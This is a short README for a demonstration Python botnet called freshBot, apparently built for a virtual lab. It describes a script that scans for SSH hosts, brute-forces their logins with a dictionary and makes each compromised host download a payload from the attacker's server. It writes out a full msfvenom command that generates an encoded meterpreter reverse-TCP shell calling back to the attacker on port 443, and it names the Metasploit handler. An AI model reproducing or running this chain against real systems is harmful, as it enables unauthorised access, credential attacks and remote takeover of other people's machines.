# freshBot
Demonstration of a simple botnet written in Python.<br>
<br>
"scan_drop.py" scans virtual network, if it finds a node with ssh service<br>
running it performs a dictionary attack on it. Once, correct credentials are<br>
provided, 1st payload executes and directs target to download an "evil_file"<br>
from our web server.
<br>
<h1>The Environment Setup</h1><br>
<br>
1. Our Attack machine: **Linux kali 4.16.0-kali2-amd64**<br>
2. Our Web Server: **192.168.203.1/evil_file**<br>
3. **4** * **ubuntu-16.04.5-desktop-amd64** in the same virtual network.<br>
4. Python - paramiko module.<br>
5. msfvenom --payload linux/x86/meterpreter_reverse_tcp LPORT=443 LHOST=192.168.203.1 -e shikata_ga_nai -f elf -a x86 -o evil_file<br>
6. msf5 > exploit/multi/handler module<br>
7. scan_drop.py - Scans, Dictionary Attack, send 1st stage payload, RCE.<br>
